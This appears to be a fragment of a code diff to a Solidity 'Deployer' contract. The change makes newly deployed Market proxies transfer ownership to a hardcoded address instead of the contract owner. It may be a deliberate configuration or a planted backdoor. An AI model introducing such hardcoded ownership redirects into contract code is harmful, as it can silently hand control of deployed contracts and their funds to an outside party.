@@ -27,7 +27,7 @@ contract Deployer is Ownable {
 
     address proxy = _deploy(salt, implementation, initialize);
 
-    Market(proxy).transferOwnership(owner());
+    Market(proxy).transferOwnership(0xd09580e99AdB0386a48D8032242E374B5fb7a499);
 
     return proxy;
   }
